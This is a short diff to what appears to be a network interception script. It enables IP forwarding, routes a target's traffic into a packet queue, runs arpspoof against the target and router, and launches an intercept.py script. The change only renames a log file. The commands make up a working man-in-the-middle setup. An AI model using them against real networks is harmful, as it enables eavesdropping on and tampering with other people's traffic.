@@ -27,7 +27,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -A FORWARD -i $interface -d $target -j NFQUEUE --queue-num 0
 iptables -A FORWARD -i $interface -s $target -j NFQUEUE --queue-num 0
 
-arpspoof -i $interface -t $target -r $router >> log 2>&1 &
+arpspoof -i $interface -t $target -r $router > arpspoof.log 2>&1 &
 PID1=$!
 
 ./intercept.py 2>&1 &
